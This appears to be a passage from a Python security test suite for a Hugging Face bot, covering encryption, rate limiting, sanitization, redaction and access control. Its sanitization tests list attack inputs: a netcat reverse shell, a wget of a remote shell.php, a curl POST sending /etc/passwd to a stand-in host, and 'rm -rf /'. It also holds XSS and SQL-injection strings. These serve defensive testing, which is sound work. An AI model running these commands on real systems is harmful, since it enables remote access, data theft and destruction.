#!/usr/bin/env python3
"""
Comprehensive Security Audit Suite for Hugging Face By AadityaLabs AI
Enterprise-grade security testing covering all critical security domains

This script tests:
1. Rate limiting and abuse prevention
2. AES-256-GCM encryption integrity 
3. Input sanitization and injection prevention
4. File validation and malware detection
5. API key and sensitive data protection
6. Security logging and monitoring
7. Authentication and authorization
8. Data privacy and user isolation
9. Network security measures
10. Information disclosure prevention
"""

import asyncio
import json
import logging
import os
import secrets
import tempfile
import time
import hashlib
import base64
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass

# Test framework imports
try:
    import pytest
except ImportError:
    print("Warning: pytest not available, running basic tests")
    pytest = None

# Import bot security components
from bot.security_utils import (
    DataRedactionEngine, SecureLogger, MarkdownSanitizer, 
    InputValidator, RateLimiter, check_rate_limit
)
from bot.crypto_utils import SecureCrypto, initialize_crypto
from bot.file_processors import AdvancedFileProcessor
from bot.config import Config
from bot.storage_manager import storage_manager

# Setup secure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)
secure_logger = SecureLogger(logger)

@dataclass
class SecurityTestResult:
    """Security test result with detailed information"""
    test_name: str
    category: str
    passed: bool
    details: str
    risk_level: str  # CRITICAL, HIGH, MEDIUM, LOW
    recommendation: str
    test_data: Dict[str, Any]
    timestamp: datetime

@dataclass
class SecurityAuditReport:
    """Comprehensive security audit report"""
    overall_score: float  # 0-100
    tests_passed: int
    tests_failed: int 
    critical_issues: int
    high_issues: int
    medium_issues: int
    low_issues: int
    results: List[SecurityTestResult]
    enterprise_compliance: bool
    timestamp: datetime
    recommendations: List[str]

class ComprehensiveSecurityAudit:
    """Enterprise-grade security audit system"""
    
    def __init__(self):
        self.results: List[SecurityTestResult] = []
        self.start_time = datetime.utcnow()
        self.test_user_ids = [12345, 67890, 11111, 22222]  # Test user IDs
        
    async def run_full_audit(self) -> SecurityAuditReport:
        """
        Run complete security audit across all domains
        
        Returns:
            SecurityAuditReport: Comprehensive audit results
        """
        secure_logger.info("🔐 Starting comprehensive security audit...")
        
        # Run all security test categories
        await self._test_rate_limiting()
        await self._test_encryption_integrity()
        await self._test_input_sanitization()
        await self._test_file_validation()
        await self._test_api_key_protection()
        await self._test_security_logging()
        await self._test_authentication_authorization()
        await self._test_data_privacy_isolation()
        await self._test_network_security()
        await self._test_error_message_security()
        
        # Generate comprehensive report
        return self._generate_audit_report()
    
    async def _test_rate_limiting(self) -> None:
        """Test 1: Rate limiting and abuse prevention"""
        secure_logger.info("🚦 Testing rate limiting mechanisms...")
        
        try:
            # Test normal rate limiting
            user_id = self.test_user_ids[0]
            requests_allowed = 0
            requests_blocked = 0
            
            # Simulate rapid requests to trigger rate limiting
            for i in range(15):  # Exceed typical limit of 10
                is_allowed, wait_time = check_rate_limit(user_id)
                if is_allowed:
                    requests_allowed += 1
                else:
                    requests_blocked += 1
                    if i < 10:  # Should allow first ~10 requests
                        self._add_result(
                            "Rate Limiting - Premature Block",
                            "Rate Limiting",
                            False,
                            f"Request {i+1} blocked prematurely",
                            "HIGH",
                            "Review rate limiting thresholds"
                        )
                        return
                time.sleep(0.1)  # Small delay between requests
            
            # Verify rate limiting is working
            if requests_blocked > 0:
                self._add_result(
                    "Rate Limiting - Basic Functionality",
                    "Rate Limiting", 
                    True,
                    f"Successfully blocked {requests_blocked}/{15} excessive requests",
                    "LOW",
                    "Rate limiting is working correctly"
                )
            else:
                self._add_result(
                    "Rate Limiting - No Blocking",
                    "Rate Limiting",
                    False,
                    "Rate limiting failed to block excessive requests",
                    "CRITICAL",
                    "Implement or fix rate limiting immediately"
                )
            
            # Test IP-based rate limiting if available
            try:
                rate_limiter = RateLimiter()
                ip_blocked = False
                for i in range(20):
                    is_allowed, wait_time = rate_limiter.is_allowed(
                        user_id, 
                        user_ip="192.168.1.100",
                        action_type="test_flood"
                    )
                    if not is_allowed:
                        ip_blocked = True
                        break
                
                self._add_result(
                    "Rate Limiting - IP Tracking",
                    "Rate Limiting",
                    ip_blocked,
                    "IP-based rate limiting working" if ip_blocked else "IP-based limiting not activated",
                    "MEDIUM" if not ip_blocked else "LOW",
                    "IP-based rate limiting provides additional protection"
                )
                
            except Exception as e:
                self._add_result(
                    "Rate Limiting - IP Testing Error",
                    "Rate Limiting",
                    False,
                    f"Error testing IP rate limiting: {e}",
                    "MEDIUM",
                    "Verify IP rate limiting implementation"
                )
                
        except Exception as e:
            self._add_result(
                "Rate Limiting - System Error",
                "Rate Limiting",
                False,
                f"Rate limiting test failed: {e}",
                "HIGH", 
                "Fix rate limiting system errors"
            )
    
    async def _test_encryption_integrity(self) -> None:
        """Test 2: AES-256-GCM encryption integrity"""
        secure_logger.info("🔒 Testing AES-256-GCM encryption...")
        
        try:
            # Initialize crypto system
            if not hasattr(Config, 'ENCRYPTION_SEED') or not Config.ENCRYPTION_SEED:
                # Generate test seed
                test_seed = secrets.token_urlsafe(32)
                os.environ['ENCRYPTION_SEED'] = test_seed
                secure_logger.warning("Using test encryption seed for security audit")
            
            initialize_crypto()
            crypto = SecureCrypto(Config.ENCRYPTION_SEED)
            
            # Test data samples
            test_cases = [
                "Simple test string",
                "🔐 Unicode and emojis: ñáéíóú",
                "API_KEY=sk-1234567890abcdef" * 10,  # Long sensitive data
                '{"user": "test", "data": [1,2,3]}',  # JSON data
                "x" * 10000,  # Large data
                ""  # Empty string edge case (should fail)
            ]
            
            encryption_passed = 0
            total_tests = len(test_cases) - 1  # Exclude empty string test
            
            for i, test_data in enumerate(test_cases):
                if not test_data:  # Test empty string failure
                    try:
                        crypto.encrypt(test_data)
                        self._add_result(
                            "Encryption - Empty String Handling",
                            "Encryption",
                            False,
                            "Empty string should not be encryptable",
                            "MEDIUM",
                            "Validate input before encryption"
                        )
                    except Exception:
                        self._add_result(
                            "Encryption - Empty String Handling",
                            "Encryption",
                            True,
                            "Correctly rejected empty string encryption",
                            "LOW",
                            "Good input validation"
                        )
                    continue
                
                try:
                    # Test encryption
                    encrypted = crypto.encrypt(test_data)
                    
                    # Verify encrypted format (should start with v1)
                    if not encrypted.startswith('v1'):
                        self._add_result(
                            f"Encryption - Format Test {i+1}",
                            "Encryption",
                            False,
                            f"Invalid envelope format: {encrypted[:10]}...",
                            "HIGH",
                            "Fix encryption envelope format"
                        )
                        continue
                    
                    # Test decryption
                    decrypted = crypto.decrypt(encrypted)
                    
                    if decrypted == test_data:
                        encryption_passed += 1
                    else:
                        self._add_result(
                            f"Encryption - Integrity Test {i+1}",
                            "Encryption",
                            False,
                            f"Decryption mismatch: {len(decrypted)} vs {len(test_data)} chars",
                            "CRITICAL",
                            "Fix encryption/decryption integrity"
                        )
                    
                    # Test per-user encryption
                    user_encrypted = crypto.encrypt(test_data, user_id=self.test_user_ids[0])
                    user_decrypted = crypto.decrypt(user_encrypted, user_id=self.test_user_ids[0])
                    
                    if user_decrypted != test_data:
                        self._add_result(
                            f"Encryption - User Isolation Test {i+1}",
                            "Encryption",
                            False,
                            "Per-user encryption failed",
                            "HIGH",
                            "Fix per-user encryption implementation"
                        )
                    
                    # Test cross-user access prevention
                    try:
                        wrong_user_decrypt = crypto.decrypt(user_encrypted, user_id=self.test_user_ids[1])
                        self._add_result(
                            f"Encryption - Cross-User Security Test {i+1}",
                            "Encryption",
                            False,
                            "Cross-user decryption should fail",
                            "CRITICAL",
                            "Fix user isolation in encryption"
                        )
                    except Exception:
                        # This should fail - good!
                        pass
                        
                except Exception as e:
                    self._add_result(
                        f"Encryption - Test Case {i+1}",
                        "Encryption",
                        False,
                        f"Encryption test failed: {str(e)[:100]}",
                        "HIGH",
                        "Fix encryption implementation"
                    )
            
            # Overall encryption assessment
            success_rate = (encryption_passed / total_tests) * 100 if total_tests > 0 else 0
            self._add_result(
                "Encryption - Overall Assessment",
                "Encryption",
                success_rate >= 95,
                f"Encryption success rate: {success_rate:.1f}% ({encryption_passed}/{total_tests})",
                "LOW" if success_rate >= 95 else "CRITICAL",
                "Encryption system is robust" if success_rate >= 95 else "Fix encryption failures"
            )
            
        except Exception as e:
            self._add_result(
                "Encryption - System Initialization",
                "Encryption",
                False,
                f"Encryption system failed to initialize: {e}",
                "CRITICAL",
                "Fix encryption system initialization"
            )
    
    async def _test_input_sanitization(self) -> None:
        """Test 3: Input sanitization and injection prevention"""
        secure_logger.info("🧼 Testing input sanitization...")
        
        # XSS test vectors
        xss_vectors = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src='javascript:alert(1)'></iframe>",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:msgbox('XSS')",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "expression(alert('XSS'))",
            "@import 'javascript:alert(\"XSS\")'",
            "<object data='data:text/html,<script>alert(1)</script>'></object>",
            "<embed src='data:text/html,<script>alert(1)</script>'></embed>"
        ]
        
        # SQL Injection test vectors
        sql_vectors = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin'--",
            "admin' /*",
            "' OR 1=1--",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "1; SELECT * FROM users",
            "UNION SELECT username, password FROM users",
            "'; WAITFOR DELAY '00:00:05'; --",
            "1' UNION SELECT 1,2,3,4--",
            "' EXEC xp_cmdshell('dir') --",
            "'; EXEC('dir'); --",
            "1'; DROP TABLE users; --",
            "1' AND (SELECT SUBSTRING(@@version, 1, 1))='M'--"
        ]
        
        # Command injection vectors
        command_vectors = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "$(id)",
            "`whoami`",
            "; rm -rf /",
            "| nc -e /bin/sh 192.168.1.1 4444",
            "; wget http://malicious.com/shell.php",
            "$(curl -X POST malicious.com -d @/etc/passwd)",
            "; python -c 'import os; os.system(\"id\")'",
            "; powershell -Command \"Get-Process\"",
            "& dir C:\\",
            "; cmd /c dir",
            "|| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "`cat /proc/version`"
        ]
        
        # Test data redaction
        redaction_tests = 0
        redaction_passed = 0
        
        all_vectors = xss_vectors + sql_vectors + command_vectors
        
        for vector in all_vectors:
            try:
                # Test markdown sanitization
                sanitized = MarkdownSanitizer.safe_markdown_format(vector)
                if vector in sanitized and any(danger in vector.lower() for danger in ['<script', 'javascript:', 'onerror=', 'onload=']):
                    self._add_result(
                        f"Sanitization - XSS Vector",
                        "Input Sanitization",
                        False,
                        f"Dangerous XSS content not sanitized: {vector[:50]}...",
                        "HIGH",
                        "Improve XSS sanitization"
                    )
                
                # Test input validator
                validator = InputValidator()
                is_malicious, threat_types, details = validator.is_malicious_input(vector)
                
                redaction_tests += 1
                if is_malicious:
                    redaction_passed += 1
                else:
                    self._add_result(
                        f"Sanitization - Threat Detection",
                        "Input Sanitization", 
                        False,
                        f"Failed to detect malicious input: {vector[:50]}...",
                        "HIGH",
                        "Improve malicious input detection"
                    )
                
            except Exception as e:
                self._add_result(
                    "Sanitization - Processing Error",
                    "Input Sanitization",
                    False,
                    f"Error processing input: {e}",
                    "MEDIUM",
                    "Fix input processing errors"
                )
        
        # Test sensitive data redaction
        sensitive_data_tests = [
            "My API key is sk-1234567890abcdefghijklmnopqrstuvwxyz",
            "Connect to mongodb://user:password@host:27017/db",
            "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
            "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
            "ghp_1234567890abcdefghijklmnopqrstuvwxyz123456",
            "My email is user@example.com and IP is 192.168.1.100",
            "Token: hf_abcdefghijklmnopqrstuvwxyz123456789",
            "postgresql://username:secret@localhost:5432/mydb"
        ]
        
        redaction_success = 0
        for sensitive_text in sensitive_data_tests:
            redacted = DataRedactionEngine.redact_sensitive_data(sensitive_text)
            if "[REDACTED" in redacted or sensitive_text != redacted:
                redaction_success += 1
            else:
                self._add_result(
                    "Sanitization - Sensitive Data Redaction",
                    "Input Sanitization",
                    False,
                    f"Failed to redact: {sensitive_text[:50]}...",
                    "HIGH",
                    "Fix sensitive data redaction"
                )
        
        # Overall sanitization assessment
        overall_success = ((redaction_passed / redaction_tests) + (redaction_success / len(sensitive_data_tests))) / 2 * 100
        self._add_result(
            "Input Sanitization - Overall Assessment", 
            "Input Sanitization",
            overall_success >= 90,
            f"Sanitization effectiveness: {overall_success:.1f}%",
            "LOW" if overall_success >= 90 else "HIGH",
            "Input sanitization is robust" if overall_success >= 90 else "Improve input sanitization"
        )
    
    async def _test_file_validation(self) -> None:
        """Test 4: File validation and malware detection"""
        secure_logger.info("📁 Testing file validation...")
        
        try:
            processor = AdvancedFileProcessor()
            
            # Create test files with various threat signatures
            test_files = []
            
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_path = Path(temp_dir)
                
                # Malicious executable (MZ header)
                exe_file = temp_path / "malware.exe"
                exe_file.write_bytes(b'\x4d\x5a' + b'\x00' * 100)
                test_files.append(("malware.exe", exe_file.read_bytes(), "Executable"))
                
                # Script with dangerous content
                script_file = temp_path / "malicious.sh" 
                script_file.write_text("#!/bin/bash\nrm -rf /\n")
                test_files.append(("malicious.sh", script_file.read_bytes(), "Shell Script"))
                
                # EICAR test file
                eicar_file = temp_path / "eicar.txt"
                eicar_content = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
                eicar_file.write_bytes(eicar_content)
                test_files.append(("eicar.txt", eicar_content, "EICAR Test"))
                
                # Oversized file
                large_content = b'A' * (15 * 1024 * 1024)  # 15MB (exceeds 10MB limit)
                test_files.append(("large.txt", large_content, "Oversized File"))
                
                # Valid file (should pass)
                valid_file = temp_path / "valid.txt"
                valid_file.write_text("This is a valid text file.")
                test_files.append(("valid.txt", valid_file.read_bytes(), "Valid File"))
                
            # Test each file
            validation_results = []
            for filename, content, file_type in test_files:
                try:
                    is_valid, error_msg = processor.validate_file_security(
                        content, filename, "document"
                    )
                    validation_results.append({
                        'filename': filename,
                        'type': file_type,
                        'is_valid': is_valid,
                        'error': error_msg,
                        'expected_valid': file_type == "Valid File"
                    })
                except Exception as e:
                    validation_results.append({
                        'filename': filename,
                        'type': file_type,
                        'is_valid': False,
                        'error': str(e),
                        'expected_valid': False
                    })
            
            # Analyze results
            correct_validations = 0
            total_validations = len(validation_results)
            
            for result in validation_results:
                expected = result['expected_valid']
                actual = result['is_valid']
                
                if expected == actual:
                    correct_validations += 1
                else:
                    risk_level = "HIGH" if not expected and actual else "MEDIUM"
                    self._add_result(
                        f"File Validation - {result['type']}",
                        "File Validation",
                        False,
                        f"Incorrect validation of {result['filename']}: expected {expected}, got {actual}",
                        risk_level,
                        "Review file validation logic"
                    )
            
            success_rate = (correct_validations / total_validations) * 100
            self._add_result(
                "File Validation - Overall Assessment",
                "File Validation",
                success_rate >= 80,
                f"File validation accuracy: {success_rate:.1f}% ({correct_validations}/{total_validations})",
                "LOW" if success_rate >= 80 else "HIGH",
                "File validation is working" if success_rate >= 80 else "Improve file validation"
            )
            
        except Exception as e:
            self._add_result(
                "File Validation - System Error",
                "File Validation",
                False,
                f"File validation test failed: {e}",
                "HIGH",
                "Fix file validation system"
            )
    
    async def _test_api_key_protection(self) -> None:
        """Test 5: API key and sensitive data protection"""
        secure_logger.info("🔑 Testing API key protection...")
        
        # Test data containing various sensitive information
        test_logs = [
            "User provided API key: sk-1234567890abcdefghijklmnopqrstuvwxyz",
            "Connecting with Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.test",
            "Database URL: mongodb://username:password@localhost:27017/database",
            "GitHub token: ghp_1234567890abcdefghijklmnopqrstuvwxyz123456",
            "AWS credentials: AKIAIOSFODNN7EXAMPLE / wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "HuggingFace token: hf_abcdefghijklmnopqrstuvwxyz123456789",
            "Email contact: support@example.com, IP: 192.168.1.100",
            "Telegram bot token: 123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ-EXAMPLE",
            "PostgreSQL: postgresql://user:secretpass@host.com:5432/dbname",
            "JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        ]
        
        redaction_success = 0
        total_tests = len(test_logs)
        
        for i, log_text in enumerate(test_logs):
            try:
                redacted = DataRedactionEngine.redact_sensitive_data(log_text)
                
                # Check if sensitive data was redacted
                has_redaction = "[REDACTED" in redacted
                
                # Check for common unredacted patterns that shouldn't be there
                dangerous_patterns = [
                    r'sk-[a-zA-Z0-9]{20,}',
                    r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
                    r'://[^:]+:[^@]+@',  # username:password in URLs
                    r'ghp_[a-zA-Z0-9]{36}',
                    r'AKIA[A-Z0-9]{16}',
                    r'hf_[a-zA-Z0-9_-]{20,}',
                    r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
                    r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
                ]
                
                import re
                unredacted_sensitive = False
                for pattern in dangerous_patterns:
                    if re.search(pattern, redacted):
                        unredacted_sensitive = True
                        break
                
                if has_redaction and not unredacted_sensitive:
                    redaction_success += 1
                else:
                    self._add_result(
                        f"API Key Protection - Test {i+1}",
                        "API Key Protection",
                        False,
                        f"Insufficient redaction: {redacted[:100]}...",
                        "HIGH",
                        "Improve sensitive data redaction patterns"
                    )
                    
            except Exception as e:
                self._add_result(
                    f"API Key Protection - Error {i+1}",
                    "API Key Protection", 
                    False,
                    f"Redaction failed: {e}",
                    "MEDIUM",
                    "Fix redaction system errors"
                )
        
        # Test crypto-specific redaction
        crypto_logs = [
            "Salt: YWJjZGVmZ2hpams=, Nonce: MTIzNDU2Nzg5MA==",
            "Ciphertext: bG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQ=",
            "IV: MTIzNDU2Nzg5MDEyMzQ1Ng==",
            "Signature: c2lnbmF0dXJlX2V4YW1wbGVfZGF0YQ=="
        ]
        
        crypto_redaction_success = 0
        for crypto_log in crypto_logs:
            try:
                redacted = DataRedactionEngine.redact_crypto_data(crypto_log)
                if "[REDACTED" in redacted:
                    crypto_redaction_success += 1
                else:
                    self._add_result(
                        "API Key Protection - Crypto Redaction",
                        "API Key Protection",
                        False,
                        f"Crypto data not redacted: {crypto_log}",
                        "MEDIUM",
                        "Improve crypto-specific redaction"
                    )
            except Exception as e:
                self._add_result(
                    "API Key Protection - Crypto Error",
                    "API Key Protection",
                    False,
                    f"Crypto redaction failed: {e}",
                    "MEDIUM",
                    "Fix crypto redaction system"
                )
        
        # Overall assessment
        overall_success = ((redaction_success / total_tests) + (crypto_redaction_success / len(crypto_logs))) / 2 * 100
        self._add_result(
            "API Key Protection - Overall Assessment",
            "API Key Protection",
            overall_success >= 90,
            f"Redaction effectiveness: {overall_success:.1f}%",
            "LOW" if overall_success >= 90 else "HIGH",
            "Sensitive data protection is robust" if overall_success >= 90 else "Improve data redaction"
        )
    
    async def _test_security_logging(self) -> None:
        """Test 6: Security logging and monitoring"""
        secure_logger.info("📊 Testing security logging...")
        
        try:
            # Test secure logger functionality
            test_logger = SecureLogger(logger)
            
            # Test sensitive data redaction in logs
            sensitive_message = "Processing API key sk-1234567890abcdef for user authentication"
            
            # Capture log output (simplified test)
            import io
            import contextlib
            
            log_stream = io.StringIO()
            stream_handler = logging.StreamHandler(log_stream)
            test_logger.logger.addHandler(stream_handler)
            
            try:
                test_logger.info(sensitive_message)
                logged_content = log_stream.getvalue()
                
                # Check if sensitive data was redacted in logs
                if "sk-1234567890abcdef" not in logged_content and "[REDACTED]" in logged_content:
                    self._add_result(
                        "Security Logging - Redaction",
                        "Security Logging",
                        True,
                        "Sensitive data properly redacted in logs",
                        "LOW",
                        "Logging redaction is working correctly"
                    )
                else:
                    self._add_result(
                        "Security Logging - Redaction",
                        "Security Logging",
                        False,
                        "Sensitive data not redacted in logs",
                        "HIGH",
                        "Fix logging redaction mechanism"
                    )
            finally:
                test_logger.logger.removeHandler(stream_handler)
            
            # Test environment-aware logging
            original_env = os.environ.get('ENVIRONMENT', '')
            
            try:
                # Test production mode (should hide stack traces)
                os.environ['ENVIRONMENT'] = 'production'
                os.environ['ENABLE_STACK_TRACES'] = 'false'
                
                prod_logger = SecureLogger(logging.getLogger('test_prod'))
                
                # Test that production logger is configured correctly
                if prod_logger.is_production and not prod_logger.enable_stack_traces:
                    self._add_result(
                        "Security Logging - Production Config",
                        "Security Logging",
                        True,
                        "Production logging properly configured (stack traces disabled)",
                        "LOW",
                        "Production logging is secure"
                    )
                else:
                    self._add_result(
                        "Security Logging - Production Config",
                        "Security Logging",
                        False,
                        f"Production config incorrect: is_prod={prod_logger.is_production}, traces={prod_logger.enable_stack_traces}",
                        "MEDIUM",
                        "Fix production logging configuration"
                    )
                
            finally:
                # Restore environment
                if original_env:
                    os.environ['ENVIRONMENT'] = original_env
                else:
                    os.environ.pop('ENVIRONMENT', None)
                os.environ.pop('ENABLE_STACK_TRACES', None)
            
            # Test audit logging
            try:
                test_logger.audit(
                    event_type="SECURITY_TEST",
                    user_id=12345,
                    details="Security audit test event",
                    success=True,
                    test_data="sensitive_info_123"
                )
                
                self._add_result(
                    "Security Logging - Audit Trail",
                    "Security Logging",
                    True,
                    "Audit logging functionality working",
                    "LOW",
                    "Audit trail is functional"
                )
                
            except Exception as e:
                self._add_result(
                    "Security Logging - Audit Error",
                    "Security Logging",
                    False,
                    f"Audit logging failed: {e}",
                    "MEDIUM",
                    "Fix audit logging system"
                )
                
        except Exception as e:
            self._add_result(
                "Security Logging - System Error",
                "Security Logging",
                False,
                f"Security logging test failed: {e}",
                "HIGH",
                "Fix security logging system"
            )
    
    async def _test_authentication_authorization(self) -> None:
        """Test 7: Authentication and authorization mechanisms"""
        secure_logger.info("🔐 Testing authentication and authorization...")
        
        try:
            # Test admin system components
            from bot.admin.system import admin_system
            from bot.admin.middleware import check_admin_access
            
            # Test bootstrap status
            bootstrap_completed = admin_system.is_bootstrap_completed()
            
            self._add_result(
                "Authentication - Admin Bootstrap",
                "Authentication",
                bootstrap_completed or Config.is_test_mode(),
                f"Admin system bootstrap: {'completed' if bootstrap_completed else 'pending'}",
                "MEDIUM" if not bootstrap_completed else "LOW",
                "Complete admin bootstrap for production" if not bootstrap_completed else "Admin system initialized"
            )
            
            # Test admin access checks for non-admin user
            test_user = 99999  # Non-admin user
            has_access, reason = await check_admin_access(test_user, min_level='admin')
            
            self._add_result(
                "Authorization - Non-Admin Access",
                "Authentication",
                not has_access,
                f"Non-admin access correctly denied: {reason}" if not has_access else "Non-admin user granted access",
                "CRITICAL" if has_access else "LOW", 
                "Fix admin access control" if has_access else "Admin access control working"
            )
            
            # Test admin rate limiting
            from bot.admin.system import admin_system
            try:
                # Test admin rate limiting (if available)
                for i in range(25):  # Try to exceed admin rate limits
                    is_allowed, wait_time = await admin_system.check_admin_rate_limit(test_user)
                    if not is_allowed:
                        self._add_result(
                            "Authorization - Admin Rate Limiting",
                            "Authentication",
                            True,
                            f"Admin rate limiting activated after {i+1} requests",
                            "LOW",
                            "Admin rate limiting is working"
                        )
                        break
                else:
                    self._add_result(
                        "Authorization - Admin Rate Limiting",
                        "Authentication", 
                        False,
                        "Admin rate limiting did not activate",
                        "MEDIUM",
                        "Review admin rate limiting configuration"
                    )
                    
            except Exception as e:
                self._add_result(
                    "Authorization - Rate Limiting Test",
                    "Authentication",
                    False,
                    f"Admin rate limiting test failed: {e}",
                    "MEDIUM",
                    "Fix admin rate limiting implementation"
                )
            
            # Test session validation (if available)
            try:
                # Test session management
                if hasattr(admin_system, '_admin_sessions'):
                    self._add_result(
                        "Authentication - Session Management",
                        "Authentication",
                        True,
                        "Session management system detected",
                        "LOW",
                        "Session management is implemented"
                    )
                else:
                    self._add_result(
                        "Authentication - Session Management",
                        "Authentication",
                        False,
                        "No session management detected",
                        "MEDIUM",
                        "Implement session management for better security"
                    )
                    
            except Exception as e:
                secure_logger.debug(f"Session management test: {e}")
            
        except Exception as e:
            self._add_result(
                "Authentication - System Error",
                "Authentication",
                False,
                f"Authentication test failed: {e}",
                "HIGH",
                "Fix authentication system"
            )
    
    async def _test_data_privacy_isolation(self) -> None:
        """Test 8: Data privacy and user isolation"""
        secure_logger.info("👤 Testing data privacy and user isolation...")
        
        try:
            # Test user data isolation in storage system
            if storage_manager.storage:
                test_data_key = "security_test_data"
                test_data_value = {"test": "security_audit", "timestamp": datetime.utcnow().isoformat()}
                
                user1_id = self.test_user_ids[0]
                user2_id = self.test_user_ids[1]
                
                # Save data for user 1
                save_success = await storage_manager.storage.save_user_data(
                    user1_id, test_data_key, test_data_value
                )
                
                if save_success:
                    # Try to retrieve user 1's data as user 2
                    cross_user_data = await storage_manager.storage.get_user_data(
                        user2_id, test_data_key
                    )
                    
                    if cross_user_data is None:
                        self._add_result(
                            "Data Privacy - User Isolation",
                            "Data Privacy",
                            True,
                            "Cross-user data access properly blocked",
                            "LOW",
                            "User data isolation is working correctly"
                        )
                    else:
                        self._add_result(
                            "Data Privacy - User Isolation",
                            "Data Privacy", 
                            False,
                            "Cross-user data access not blocked",
                            "CRITICAL",
                            "Fix user data isolation immediately"
                        )
                    
                    # Verify user 1 can access their own data
                    own_data = await storage_manager.storage.get_user_data(
                        user1_id, test_data_key
                    )
                    
                    if own_data == test_data_value:
                        self._add_result(
                            "Data Privacy - Own Data Access",
                            "Data Privacy",
                            True,
                            "User can access their own data",
                            "LOW",
                            "User data access working correctly"
                        )
                    else:
                        self._add_result(
                            "Data Privacy - Own Data Access",
                            "Data Privacy",
                            False,
                            "User cannot access their own data",
                            "HIGH",
                            "Fix user data access"
                        )
                    
                    # Clean up test data
                    try:
                        if hasattr(storage_manager.storage, 'delete_user_data'):
                            await storage_manager.storage.delete_user_data(user1_id, test_data_key)
                    except Exception:
                        pass  # Cleanup failure is not critical for test
                        
                else:
                    self._add_result(
                        "Data Privacy - Data Storage",
                        "Data Privacy",
                        False,
                        "Failed to save user data for testing",
                        "MEDIUM",
                        "Fix user data storage"
                    )
            else:
                self._add_result(
                    "Data Privacy - Storage System",
                    "Data Privacy",
                    False,
                    "Storage system not available for testing",
                    "HIGH",
                    "Initialize storage system"
                )
            
            # Test per-user encryption key derivation
            try:
                if hasattr(Config, 'ENCRYPTION_SEED') and Config.ENCRYPTION_SEED:
                    crypto = SecureCrypto(Config.ENCRYPTION_SEED)
                    
                    test_plaintext = "User isolation test data"
                    
                    # Encrypt for user 1
                    user1_encrypted = crypto.encrypt(test_plaintext, user_id=user1_id)
                    
                    # Encrypt same data for user 2
                    user2_encrypted = crypto.encrypt(test_plaintext, user_id=user2_id)
                    
                    # They should be different (different user keys)
                    if user1_encrypted != user2_encrypted:
                        self._add_result(
                            "Data Privacy - Per-User Encryption",
                            "Data Privacy",
                            True,
                            "Per-user encryption keys working (different ciphertexts)",
                            "LOW",
                            "Per-user encryption is working correctly"
                        )
                    else:
                        self._add_result(
                            "Data Privacy - Per-User Encryption",
                            "Data Privacy",
                            False,
                            "Per-user encryption not working (identical ciphertexts)",
                            "HIGH",
                            "Fix per-user encryption key derivation"
                        )
                    
                    # Test cross-user decryption prevention
                    try:
                        cross_decrypt = crypto.decrypt(user1_encrypted, user_id=user2_id)
                        self._add_result(
                            "Data Privacy - Cross-User Decryption",
                            "Data Privacy",
                            False,
                            "Cross-user decryption succeeded when it should fail",
                            "CRITICAL",
                            "Fix user isolation in encryption"
                        )
                    except Exception:
                        self._add_result(
                            "Data Privacy - Cross-User Decryption",
                            "Data Privacy",
                            True,
                            "Cross-user decryption properly blocked",
                            "LOW",
                            "Encryption user isolation working"
                        )
                        
            except Exception as e:
                self._add_result(
                    "Data Privacy - Encryption Test",
                    "Data Privacy",
                    False,
                    f"Per-user encryption test failed: {e}",
                    "MEDIUM",
                    "Fix per-user encryption system"
                )
                
        except Exception as e:
            self._add_result(
                "Data Privacy - System Error",
                "Data Privacy",
                False,
                f"Data privacy test failed: {e}",
                "HIGH",
                "Fix data privacy system"
            )
    
    async def _test_network_security(self) -> None:
        """Test 9: Network security measures"""
        secure_logger.info("🌐 Testing network security...")
        
        try:
            # Test TLS configuration validation
            from bot.config import Config
            
            mongodb_uri = Config.get_mongodb_uri()
            supabase_url = Config.get_supabase_mgmt_url()
            
            # Check MongoDB TLS
            if mongodb_uri:
                has_tls = (
                    mongodb_uri.startswith('mongodb+srv://') or
                    'tls=true' in mongodb_uri.lower() or
                    'ssl=true' in mongodb_uri.lower()
                )
                
                # Check if production environment
                env = os.environ.get('ENVIRONMENT', '').lower()
                is_production = env == 'production'
                
                if is_production and not has_tls:
                    self._add_result(
                        "Network Security - MongoDB TLS",
                        "Network Security",
                        False,
                        "Production MongoDB connection without TLS",
                        "CRITICAL",
                        "Enable TLS for production MongoDB connections"
                    )
                elif has_tls:
                    self._add_result(
                        "Network Security - MongoDB TLS",
                        "Network Security",
                        True,
                        "MongoDB connection uses TLS encryption",
                        "LOW",
                        "MongoDB TLS configuration is secure"
                    )
                else:
                    self._add_result(
                        "Network Security - MongoDB TLS",
                        "Network Security",
                        True,  # OK for development
                        "MongoDB TLS not enabled (development mode)",
                        "MEDIUM",
